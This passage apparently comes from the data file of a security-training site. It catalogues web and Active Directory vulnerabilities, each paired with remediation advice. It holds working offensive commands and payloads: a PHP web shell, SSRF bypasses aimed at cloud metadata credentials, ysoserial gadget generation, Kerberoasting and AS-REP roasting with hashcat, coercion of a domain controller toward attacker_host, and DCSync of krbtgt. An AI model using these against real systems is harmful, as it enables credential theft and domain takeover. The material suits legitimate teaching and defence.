            columns: ["Pattern", "Example"],
            rows: [
              ["Trusting client values", "Price/discount/total computed or sent by the client and accepted"],
              ["Missing server-side limits", "Quantity, balance, or rate checks only enforced in the UI"],
              ["Workflow step skipping", "Reaching a later state without completing required prior steps"],
              ["Insufficient validation", "Negative numbers, integer overflow, currency or unit confusion"],
              ["Assumption breaking", "Doing steps out of order, or in parallel, in ways the design never expected"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Approach", "Detail"],
            rows: [
              ["Model the intent", "Write down what each workflow is supposed to guarantee, then attack that guarantee"],
              ["Tamper every value", "Negative, zero, huge, wrong-type, and someone-else's values"],
              ["Reorder and skip", "Replay steps out of sequence; call endpoints directly"],
              ["Test limits", "Push past quotas, reuse single-use items, and combine discounts"],
              ["Concurrency", "Fire simultaneous requests to break assumptions (overlaps with race conditions)"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Financial loss", "Free goods, negative charges, infinite discounts, refund abuse"],
              ["Policy bypass", "Circumvent limits, approvals, or entitlements"],
              ["Data integrity", "Objects left in impossible or inconsistent states"],
              ["Fraud", "Loyalty/referral/coupon abuse at scale"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce all business rules server-side; treat the client as untrusted for prices, totals, quantities, and state.",
              "Recompute security- and money-relevant values on the server from trusted data, never accept them from the request.",
              "Validate value ranges and types strictly (no negatives where nonsensical, no overflow).",
              "Enforce workflow order and idempotency server-side; verify each step's preconditions.",
              "Threat-model each critical workflow and add abuse-case tests — scanners will not find these for you."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Server-Side",
    vulns: [
      {
        id: "ssrf",
        name: "Server-Side Request Forgery (SSRF)",
        severity: "High",
        ref: "https://portswigger.net/web-security/ssrf",
        description: "The server is tricked into making requests to attacker-chosen URLs, reaching internal services and cloud metadata.",
        brief: "SSRF occurs when an application fetches a URL supplied or influenced by the user and does not restrict where that request can go. The attacker points it at internal-only services, the loopback interface, or the cloud metadata endpoint — and the server, trusted inside the network, makes the request on their behalf.\n\nIt is especially dangerous in cloud environments, where the metadata service (169.254.169.254) hands out temporary credentials to anything that can reach it. SSRF is a frequent first step toward internal compromise.",
        quickReference: [
          { label: "Cloud metadata (AWS)", cmd: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
          { label: "Internal / loopback", cmd: "http://127.0.0.1:8080/   http://localhost/admin   http://10.0.0.5/" },
          { label: "Filter bypasses", cmd: "http://127.1   http://0177.0.0.1   http://[::1]   http://2130706433/   DNS rebinding" },
          { label: "Blind SSRF", cmd: "Point at a Collaborator/OAST host to confirm the server made the request" }
        ],
        sections: [
          {
            title: "Where It Hides",
            type: "table",
            columns: ["Feature", "Why"],
            rows: [
              ["URL fetchers", "Webhooks, URL preview, 'import from URL', PDF/screenshot generators"],
              ["File/image processors", "Servers that fetch remote images or follow embedded references"],
              ["Integrations", "Callbacks, OAuth discovery, XML/SVG (see XXE), and API proxies"],
              ["Redirect following", "A fetch that follows redirects can be sent inward after passing a filter"]
            ]
          },
          {
            title: "Filter Bypasses",
            type: "table",
            columns: ["Defence", "Bypass"],
            rows: [
              ["Block 'localhost'/127.0.0.1", "127.1, 0.0.0.0, 0177.0.0.1 (octal), 2130706433 (decimal), [::1], 127.0.0.1.nip.io"],
              ["Allow-list a domain", "attacker-domain that resolves to an internal IP; or user@internal in the URL"],
              ["Block internal on first request", "Open redirect on an allowed host, or DNS rebinding (TOCTOU)"],
              ["Scheme filtering", "file://, gopher://, dict:// where the client library supports them"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Cloud credential theft", "Read IAM/metadata credentials, then act as the instance role"],
              ["Internal recon & access", "Port-scan and reach internal-only services and admin panels"],
              ["Data exfiltration", "Pull internal responses back through the vulnerable app"],
              ["Escalation", "Chain to RCE via internal services (e.g. unauthenticated admin APIs)"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Allow-list the exact hosts/schemes the feature legitimately needs; deny everything else, including redirects to new hosts.",
              "Resolve the hostname and validate the resulting IP is public before connecting, and re-validate after redirects to defeat rebinding.",
              "Block link-local (169.254.0.0/16), loopback, and RFC1918 ranges at the application and network layers.",
              "Enforce IMDSv2 (session-token metadata) in AWS and equivalent hardening in other clouds; restrict metadata access.",
              "Isolate the fetching service on a segmented network with strict egress controls."
            ]
          }
        ]
      },
      {
        id: "insecure-deserialization",
        name: "Insecure Deserialization",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/deserialization",
        description: "Deserializing attacker-controlled data instantiates dangerous object graphs, often leading to RCE.",
        brief: "Serialization turns objects into a byte/stream format; deserialization rebuilds them. When an application deserializes data an attacker controls, and the runtime's classpath contains suitable 'gadget' classes, a crafted object graph triggers a chain of method calls during reconstruction — frequently ending in command execution.\n\nIt affects Java, .NET, PHP, Python (pickle), Ruby, and Node, and it is critical because it is often reachable in cookies, hidden fields, view state, and message queues without any special privilege.",
        quickReference: [
          { label: "Java serialized blob (spot it)", cmd: "Base64 starting rO0AB...   raw bytes AC ED 00 05" },
          { label: "Generate a Java gadget", cmd: "java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0" },
          { label: "Safe detection (no RCE)", cmd: "ysoserial URLDNS \"http://you.oastify.com\"  — a DNS hit confirms the sink" },
          { label: ".NET ViewState / PHP", cmd: "ysoserial.net for __VIEWSTATE; PHP object injection via unserialize()" }
        ],
        sections: [
          {
            title: "Where the Data Enters",
            type: "table",
            columns: ["Location", "Format"],
            rows: [
              ["Cookies / hidden fields", "Serialized session or state objects"],
              ["ASP.NET __VIEWSTATE", ".NET serialized state (attack with ysoserial.net)"],
              ["APIs / message queues", "RMI, JMX, T3 (WebLogic), AMQP payloads"],
              ["File uploads", "Objects/session files the app deserializes"],
              ["Content-Type tells", "application/x-java-serialized-object; PHP unserialize() inputs"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Spot serialized data", "rO0AB / AC ED (Java), ViewState, PHP O:/a: patterns in traffic"],
              ["Confirm safely", "Send a URLDNS payload with an OOB callback — a lookup proves deserialization without RCE"],
              ["Identify gadgets", "Probe likely libraries (CommonsCollections, etc.); errors reveal the stack"],
              ["Weaponise", "Swap in a benign command once a chain lands"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Remote code execution", "The headline outcome with a working gadget chain"],
              ["Auth/logic bypass", "Tamper serialized fields (roles, flags) even without RCE"],
              ["Denial of service", "Object graphs that exhaust CPU/memory on load"],
              ["Full compromise", "RCE as the app process, then internal pivoting"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not deserialize untrusted data. Where you must exchange objects, use a simple data format (JSON) with a strict schema and no type resolution.",
              "If native deserialization is unavoidable, use allow-list-based look-ahead deserialization that permits only expected classes.",
              "Sign and integrity-check any serialized state you must round-trip through the client (e.g. keyed HMAC on ViewState).",
              "Keep gadget-prone libraries updated and removed where unused; monitor for deserialization advisories.",
              "Confirm findings with a benign OOB payload (URLDNS) rather than firing RCE on production."
            ]
          }
        ]
      },
      {
        id: "file-upload",
        name: "Unrestricted File Upload",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
        description: "Weak upload validation lets an attacker place executable or malicious files on the server.",
        brief: "File upload becomes dangerous when the application does not properly restrict what can be uploaded and where it lands. If an attacker can upload a server-executable file (a web shell) into a web-accessible, executable directory, the result is remote code execution. Even without execution, weak handling enables stored XSS (SVG/HTML), path traversal, and denial of service.\n\nThe common failures are trusting the client-supplied filename or Content-Type, checking only the extension, and storing uploads under the web root where they can be requested and run.",
        quickReference: [
          { label: "Web shell (PHP)", cmd: "shell.php  ->  <?php system($_GET['c']); ?>" },
          { label: "Extension bypasses", cmd: "shell.php.jpg   shell.pHp   shell.phtml   shell.php%00.jpg   double extension" },
          { label: "Content-Type / magic-byte spoof", cmd: "Send image/png with GIF89a header + PHP payload" },
          { label: "Non-RCE impact", cmd: "malicious.svg (stored XSS), ../../ in filename (path traversal)" }
        ],
        sections: [
          {
            title: "Validation Bypasses",
            type: "table",
            columns: ["Check", "Bypass"],
            rows: [
              ["Extension allow-list", "Alternate exec extensions (.phtml, .php5, .asp;.jpg), case tricks, double extensions"],
              ["Client Content-Type", "Trivially forged in the request"],
              ["Magic-byte check only", "Prepend a valid image header, append the payload (polyglot)"],
              ["Blacklist of extensions", "Miss one variant, or rely on .htaccess/web.config upload to enable execution"],
              ["Filename trust", "../ path traversal to write outside the intended directory"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Upload a benign test", "Learn where files land and whether the path is predictable and web-accessible"],
              ["Probe execution", "Try to get a server-side script to execute at its stored URL"],
              ["Bypass filters", "Iterate extensions, Content-Type, and magic bytes"],
              ["Try non-exec impact", "SVG/HTML for stored XSS; traversal in the filename"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Remote code execution", "Web shell executes on the server"],
              ["Stored XSS", "SVG/HTML served inline runs script in viewers' browsers"],
              ["Path traversal / overwrite", "Write files outside the upload directory"],
              ["Denial of service", "Huge files or decompression bombs exhaust resources"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Store uploads outside the web root, or in storage that cannot execute code, and serve them via a handler — never let the upload directory run scripts.",
              "Validate with a strict allow-list of extensions AND verified content type; generate a random server-side filename and set the extension yourself.",
              "Serve downloads with Content-Disposition: attachment and a correct Content-Type; force SVG/HTML to download rather than render.",
              "Enforce size limits and scan for malware; re-encode images to strip embedded payloads.",
              "Never use the client-supplied filename for the stored path; strip directory components entirely."
            ]
          }
        ]
      },
      {
        id: "path-traversal",
        name: "Path Traversal / LFI / RFI",
        severity: "High",
        ref: "https://portswigger.net/web-security/file-path-traversal",
        description: "User input in a file path escapes the intended directory to read (or include and execute) arbitrary files.",
        brief: "Path traversal (directory traversal) occurs when user input is used to build a filesystem path without proper validation, letting an attacker use ../ sequences to reach files outside the intended directory. When the file is merely read, it is Local File Inclusion — leaking source code, config, and secrets. When the platform executes included files (classically PHP), it becomes Local or Remote File Inclusion and can reach code execution.\n\nThe defect is trusting user input to name a file; the fix is to never build a path from raw input.",
        quickReference: [
          { label: "Basic traversal", cmd: "?file=../../../../etc/passwd   ?page=..\\..\\windows\\win.ini" },
          { label: "Encoding bypasses", cmd: "%2e%2e%2f   ..%252f (double)   ....//   %c0%ae (overlong)" },
          { label: "PHP LFI wrappers", cmd: "php://filter/convert.base64-encode/resource=index.php   php://input   data://" },
          { label: "Log poisoning -> RCE", cmd: "Poison an accessible log (UA/headers) with PHP, then LFI-include it" }
        ],
        sections: [
          {
            title: "Bypasses",
            type: "table",
            columns: ["Defence", "Bypass"],
            rows: [
              ["Strips ../", "Nested ....// so one removal leaves ../ ; or absolute path /etc/passwd"],
              ["URL-decodes once", "Double-encode: ..%252f"],
              ["Requires an extension", "Null byte %00 (legacy), or a php://filter wrapper to still read"],
              ["Allow-list a prefix", "Start with the allowed prefix, then traverse out of it"],
              ["Blocks encodings", "Overlong UTF-8 (%c0%ae) on some stacks"]
            ]
          },
          {
            title: "LFI vs RFI",
            type: "table",
            columns: ["Variant", "Detail"],
            rows: [
              ["LFI (read)", "Include/read a local file — source, config, /etc/passwd, keys"],
              ["LFI to RCE", "Include a file you can control: uploaded file, poisoned log, /proc/self/environ, PHP session"],
              ["RFI", "Include a remote URL (requires allow_url_include) — direct RCE, now rare by default"],
              ["Wrappers", "php://filter to exfiltrate source; data:// / php://input to inject code"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Source/secret disclosure", "Read application source, .env, config, private keys"],
              ["Credential theft", "DB creds and API keys from config files"],
              ["Remote code execution", "Via inclusion of controllable content (LFI->RCE, RFI)"],
              ["Further recon", "Read /etc/passwd, process env, and internal paths"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Do not build file paths from user input. Map an input key to a fixed server-side list of allowed files instead.",
              "If a path component is unavoidable, canonicalise it and verify the resolved path stays within the intended base directory.",
              "Strip path separators and traversal sequences after decoding, and reject absolute paths and wrappers.",
              "Disable dangerous include features (allow_url_include/allow_url_fopen in PHP) and run with least filesystem privilege.",
              "Keep secrets out of web-readable locations so a read primitive yields less."
            ]
          }
        ]
      },
      {
        id: "race-condition",
        name: "Race Conditions",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/race-conditions",
        description: "Concurrent requests hit a check-then-act window, letting a limited action happen more times than allowed.",
        brief: "A race condition (TOCTOU — time-of-check to time-of-use) exists when an application checks a condition and then acts on it non-atomically, so two requests sent close together both pass the check before either completes the action. The result is a limit enforced once being applied many times: a gift card redeemed twice, a single-use coupon reused, a withdrawal exceeding the balance.\n\nModern tooling (Burp's single-packet attack / Turbo Intruder) makes these windows exploitable even when they are only microseconds wide.",
        quickReference: [
          { label: "The idea", cmd: "Send N identical requests simultaneously to beat a check-then-act gap" },
          { label: "Tooling", cmd: "Burp Repeater 'Send group in parallel' (single-packet attack); Turbo Intruder" },
          { label: "Classic targets", cmd: "Redeem code/coupon, apply discount, withdraw/transfer, vote/like, register username" },
          { label: "Signal", cmd: "The action succeeds more times than the limit should allow" }
        ],
        sections: [
          {
            title: "Vulnerable Patterns",
            type: "table",
            columns: ["Pattern", "Example"],
            rows: [
              ["Limit check then apply", "Balance/quantity/quota verified, then decremented in a separate step"],
              ["Single-use tokens", "Coupon/gift-card marked used after the benefit is granted"],
              ["Uniqueness checks", "Register the same username/email in parallel before the unique constraint bites"],
              ["State transitions", "Approve/cancel/refund fired concurrently to reach an inconsistent state"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Identify limited actions", "Anything with a 'once' or a cap tied to money or entitlement"],
              ["Send in parallel", "Use the single-packet attack to land requests within the same window"],
              ["Compare to baseline", "Did the benefit apply more times than allowed?"],
              ["Tune concurrency", "Vary the number of parallel requests and timing"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Financial loss", "Multi-redeem credits, over-limit withdrawals, duplicated refunds"],
              ["Limit bypass", "Exceed per-user caps and single-use restrictions"],
              ["Data inconsistency", "Duplicate records or impossible states"],
              ["Fraud at scale", "Automated abuse of coupons/referrals"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Make check-and-act atomic: use database transactions with appropriate isolation, or atomic operations (SELECT ... FOR UPDATE, conditional updates).",
              "Enforce uniqueness and limits with database constraints, not application-level checks alone.",
              "Use idempotency keys for sensitive operations so repeats are safely ignored.",
              "Lock or serialise per-resource operations (e.g. per-account) where a race would be costly.",
              "Test concurrency explicitly with parallel requests as part of security testing."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    vulns: [
      {
        id: "kerberoasting-vuln",
        name: "Kerberoasting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1558/003/",
        theory: "theory/2026-08-18-kerberos.html",
        description: "Any domain user requests service tickets for SPN accounts and cracks them offline to recover service-account passwords — often a direct path to high privilege.",
        brief: "Kerberos issues a service ticket (TGS) to any authenticated user who asks for a given Service Principal Name, and the ticket is encrypted with the target service account's password-derived key. Kerberoasting requests those tickets and cracks them offline. No elevated privilege is needed and the request is indistinguishable from normal Kerberos traffic.\n\nImpact: service accounts are frequently over-privileged (sometimes Domain Admins) with weak, never-rotated passwords, so one cracked ticket can jump straight to high privilege.",
        quickReference: [
          { label: "Enumerate roastable accounts (LDAP filter)", cmd: "(&(objectClass=user)(servicePrincipalName=*))" },
          { label: "Request tickets — Impacket (Linux)", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -outputfile hashes.kerberoast" },
          { label: "Request tickets — Rubeus (Windows)", cmd: "Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast" },
          { label: "Crack offline", cmd: "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate accounts that have an SPN (from any domain user)", cmd: "# Impacket lists them and can request in one go\nGetUserSPNs.py -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   corp.local/jdoe:Passw0rd  -> any valid domain credential\n#   the output lists sAMAccountName + SPN of every service account" },
              { label: "2. Request the TGS tickets and dump the crackable hashes", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' \\\n  -outputfile hashes.kerberoast\n#   -request        actually asks the KDC for a TGS per SPN\n#   -outputfile     writes the $krb5tgs$ hashes ready for hashcat\n# Target one account instead of all:\n#   -request-user svc_sql" },
              { label: "3. Prefer RC4 tickets — they crack orders of magnitude faster than AES", cmd: "# Rubeus can force RC4 (etype 23) and filter for likely-weak accounts\nRubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.kerberoast\n#   /rc4opsec  request RC4 only where it won't downgrade an AES-only account (quieter)\n#   /nowrap    keep each hash on one line for hashcat" },
              { label: "4. Crack offline (no traffic to the target)", cmd: "hashcat -m 13100 hashes.kerberoast rockyou.txt -r rules/best64.rule\n#   -m 13100   Kerberoast (TGS-REP) mode\n# a hit gives the service account's cleartext password" },
              { label: "5. Targeted Kerberoast — add an SPN to a user you can write to, then roast it", cmd: "# needs GenericWrite/GenericAll over the target (see Dangerous AD ACLs)\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v 'fake/svc'\nGetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -request-user svc_target\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v ''  # clean up" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Authenticate with any domain user", "Foothold to send Kerberos requests"],
              ["2", "LDAP-query accounts with servicePrincipalName set", "List of roastable service accounts"],
              ["3", "Send TGS-REQ for each SPN (RC4 preferred)", "TGS-REP encrypted with the account's key"],
              ["4", "Crack the $krb5tgs$ hash offline", "Service account cleartext password"],
              ["5", "Authenticate as the service account", "Its privileges — frequently local admin or DA"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket GetUserSPNs.py", "Enumerate and request TGS tickets from Linux"],
              ["Rubeus", "Request/roast from a domain-joined Windows host, RC4 opsec"],
              ["NetExec", "--kerberoasting one-liner across the domain"],
              ["hashcat / John", "Offline cracking (mode 13100)"],
              ["bloodyAD / PowerView", "Write an SPN for targeted Kerberoasting"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1558.003 — Kerberoasting", url: "https://attack.mitre.org/techniques/T1558/003/" },
              { label: "HackingArticles — Deep dive into Kerberoasting", url: "https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/" },
              { label: "The Hacker Recipes — Kerberoast", url: "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use Group Managed Service Accounts (gMSA/dMSA) — the DC manages a 120+ character password automatically, making cracking infeasible.",
              "Where gMSA is not possible, enforce 25+ character random passwords on service accounts.",
              "Enforce AES-only Kerberos to remove the fast RC4 cracking path (msDS-SupportedEncryptionTypes).",
              "Apply least privilege to service accounts so a crack has minimal blast radius; never make a service account a Domain Admin.",
              "Detect: event 4769 RC4 ticket-request spikes from one account; deploy a honeypot SPN account that no legitimate service uses."
            ]
          }
        ]
      },
      {
        id: "asrep-roasting-vuln",
        name: "AS-REP Roasting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1558/004/",
        theory: "theory/2026-08-18-kerberos.html",
        description: "Accounts with Kerberos pre-authentication disabled hand out crackable AS-REP material — obtainable with only a username list, no credentials.",
        brief: "Normal Kerberos requires pre-authentication: the client proves it knows the password before the KDC issues anything. When 'do not require pre-authentication' is set on an account, anyone can request an AS-REP for it and receive material encrypted with that account's key, crackable offline.\n\nImpact: with a valid credential you enumerate these accounts over LDAP; with only a username list you can request AS-REPs unauthenticated — so this can produce a first crackable credential from nothing but a name list.",
        quickReference: [
          { label: "Find pre-auth-disabled accounts (LDAP filter)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
          { label: "With creds — enumerate + roast", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt" },
          { label: "No creds — from a username list", cmd: "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10" },
          { label: "Crack", cmd: "hashcat -m 18200 asrep.txt rockyou.txt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. (No credentials) Build a username list, then request AS-REPs", cmd: "# usernames from OSINT, doc metadata, or a naming convention\nGetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt\n#   corp.local/     domain, empty user (the AS-REQ itself needs no auth)\n#   -no-pass        do not attempt a password\n#   any account with pre-auth off returns a $krb5asrep$ hash" },
              { label: "2. (With a credential) Enumerate the vulnerable accounts directly", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\n# or query LDAP for the DONT_REQ_PREAUTH bit:\n#   (userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
              { label: "3. Rubeus equivalent from a domain host", cmd: "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt" },
              { label: "4. Crack offline", cmd: "hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule\n#   -m 18200   Kerberos 5 AS-REP (etype 23)" },
              { label: "5. Targeted AS-REP roast — if you can write UAC on a target", cmd: "# with GenericWrite over the account, flip pre-auth off, roast, flip back\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local add uac svc_target -f DONT_REQ_PREAUTH\nGetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local remove uac svc_target -f DONT_REQ_PREAUTH" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain a username list (OSINT) or a domain credential", "Candidates to test / ability to enumerate"],
              ["2", "Request AS-REP for accounts with pre-auth disabled", "$krb5asrep$ hash (no password needed)"],
              ["3", "Crack the AS-REP hash offline", "Account cleartext password"],
              ["4", "Authenticate as the account", "Foothold or privilege, depending on the account"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket GetNPUsers.py", "Enumerate/request AS-REPs (with or without creds)"],
              ["Rubeus", "asreproast from a Windows host"],
              ["Kerbrute", "Quietly confirm which usernames exist first"],
              ["hashcat / John", "Offline cracking (mode 18200)"],
              ["bloodyAD / PowerView", "Toggle DONT_REQ_PREAUTH for targeted roasting"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1558.004 — AS-REP Roasting", url: "https://attack.mitre.org/techniques/T1558/004/" },
              { label: "The Hacker Recipes — AS-REP roast", url: "https://www.thehacker.recipes/ad/movement/kerberos/asreproast" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit for and clear the DONT_REQ_PREAUTH flag everywhere; never disable Kerberos pre-authentication.",
              "If an exception is genuinely required, give the account a long random password so the AS-REP is uncrackable.",
              "Enforce AES to slow cracking where the flag cannot be removed immediately.",
              "Detect: event 4768 with pre-auth type 0 for such accounts; deploy a honeypot account with pre-auth disabled and a strong password."
            ]
          }
        ]
      },
      {
        id: "unconstrained-delegation",
        name: "Unconstrained Delegation",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/",
        theory: "theory/2026-08-18-delegation.html",
        description: "A host trusted for unconstrained delegation caches the TGT of everyone who authenticates to it — coerce a DC and capture its TGT for domain compromise.",
        brief: "A computer trusted for unconstrained delegation stores the full TGT of any user who authenticates to it, so it can impersonate them anywhere. Compromise such a host — or coerce a high-value account like a domain controller into authenticating to it — and you capture that TGT.\n\nImpact: capturing a DC's TGT is effectively domain compromise. The danger is greatest when an ordinary server (not just a DC) is trusted for unconstrained delegation, because it becomes a stepping stone to the DC's identity.",
        quickReference: [
          { label: "Find unconstrained-delegation hosts (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=524288)" },
          { label: "PowerView", cmd: "Get-DomainComputer -Unconstrained -Properties dnshostname" },
          { label: "Listen for and capture inbound TGTs", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
          { label: "Coerce a DC to authenticate to your host", cmd: "printerbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate hosts trusted for unconstrained delegation", cmd: "# the TRUSTED_FOR_DELEGATION UAC bit (524288)\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname\n# BloodHound flags these too; DCs have it by design — the risk is any OTHER host that has it" },
              { label: "2. On the delegation host you control, run a capture listener", cmd: "# you need the host account's key material (own the host first, or use a computer object you created)\nkrbrelayx.py -aesKey <host_account_AES256_key>\n# it waits for inbound authentications and extracts the cached TGT" },
              { label: "3. Coerce a domain controller to authenticate to your host", cmd: "# PrinterBug (MS-RPRN) forces DC01's machine account to connect back\nprinterbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host\n# alternatives: PetitPotam (MS-EFSRPC), Coercer (sprays every method)" },
              { label: "4. Reuse the captured DC TGT to replicate secrets (DCSync)", cmd: "export KRB5CCNAME='DC01$@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass -just-dc-user krbtgt dc01.corp.local\n#   -k -no-pass   use the Kerberos ticket in KRB5CCNAME, no password\n# the krbtgt hash -> Golden Ticket -> full domain persistence" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a host with TRUSTED_FOR_DELEGATION", "Delegation-trusted target"],
              ["2", "Gain control of that host's key material", "Ability to run the capture listener"],
              ["3", "Run krbrelayx capture listener", "Waiting to receive TGTs"],
              ["4", "Coerce a DC (PrinterBug/PetitPotam) to authenticate", "DC machine-account TGT cached on your host"],
              ["5", "Reuse the DC TGT to DCSync", "krbtgt hash → domain compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PowerView / BloodHound", "Find unconstrained-delegation hosts"],
              ["krbrelayx.py", "Capture the TGT cached by the coerced authentication"],
              ["printerbug.py / PetitPotam / Coercer", "Force a DC to authenticate to your host"],
              ["Impacket secretsdump.py", "DCSync with the captured DC TGT"],
              ["Rubeus", "monitor/tgtdeleg on a compromised Windows delegation host"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Kerberos Delegation", url: "https://hadess.io/" },
              { label: "dirkjanm — Exploiting unconstrained delegation", url: "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/" },
              { label: "The Hacker Recipes — Unconstrained delegation", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Eliminate unconstrained delegation except where strictly required, and never on non-DC servers.",
              "Put sensitive/Tier-0 accounts in the Protected Users group or mark them 'account is sensitive and cannot be delegated' (NOT_DELEGATED).",
              "Disable the Print Spooler on DCs and patch coercion vectors to remove the trigger.",
              "Prefer resource-based constrained delegation with tight scoping over unconstrained/constrained delegation.",
              "Detect: coercion RPC calls (MS-RPRN/MS-EFSRPC) and anomalous TGT usage from non-DC hosts."
            ]
          }
        ]
      },
      {
        id: "constrained-delegation",
        name: "Constrained Delegation (S4U / Bronze Bit)",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/003/",
        theory: "theory/2026-08-18-delegation.html",
        description: "An account configured for constrained delegation with protocol transition can impersonate any user to its allowed services — and the SPN in the ticket can be swapped to reach others.",
        brief: "Constrained delegation limits an account to impersonating users only to the services listed in its msDS-AllowedToDelegateTo. Protocol transition (S4U2Self) lets it obtain a ticket to itself as ANY user — even one who never authenticated — and S4U2Proxy then converts that into a ticket to an allowed service.\n\nImpact: compromise an account with constrained delegation and you can impersonate a domain admin to its target services. Because the SPN in the S4U2Proxy ticket is plaintext, it can be rewritten (e.g. cifs → http) to reach other services on the same host. The Bronze Bit (CVE-2020-17049) removes even the 'forwardable' safeguard.",
        quickReference: [
          { label: "Find constrained-delegation accounts", cmd: "Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto" },
          { label: "Impersonate Administrator via S4U (Impacket)", cmd: "getST.py -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_web:'Passw0rd'" },
          { label: "Rubeus S4U", cmd: "Rubeus.exe s4u /user:svc_web /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/dc01 /altservice:http /ptt" },
          { label: "Bronze Bit (force forwardable)", cmd: "getST.py -spn cifs/dc01 -impersonate Administrator -force-forwardable corp.local/svc_web -hashes :<NTLM>" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
